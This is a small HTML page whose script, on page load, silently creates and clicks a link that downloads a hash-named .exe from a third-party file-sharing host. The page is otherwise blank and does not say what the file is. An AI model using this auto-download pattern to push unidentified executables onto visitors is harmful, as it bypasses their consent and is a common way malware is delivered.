<!DOCTYPE html>
<html>

<head>
    <title>DownloadURL</title>
    <script>
        window.onload = function () {
            // 下载地址
            var downloadUrl = 'https://i-430.lanzouc.com:446/01012200155601814bb/2024/01/01/4b4ec9f45dc4a2092288c6231d549b01.exe?st=MrJr38ZhguVaugV_eVmclA&e=1704122828&b=AQQAcgVsAnMDM1JJCzJXPQE9CRFXI1Y9ASIJKlMxVy0CNQ_c_c&fi=155601814&pid=52-1-116-95&up=2&mp=0&co=0';

            // 从链接中解析出文件名
            var fileName = downloadUrl.substring(downloadUrl.lastIndexOf('/') + 1, downloadUrl.indexOf('?'));
            fileName = decodeURIComponent(fileName);

            // 创建下载链接
            var downloadLink = document.createElement('a');
            downloadLink.href = downloadUrl;
            downloadLink.download = fileName;

            // 触发下载
            document.body.appendChild(downloadLink);
            downloadLink.click();
            document.body.removeChild(downloadLink);
        };
    </script>
</head>

<body>

</body>

</html>
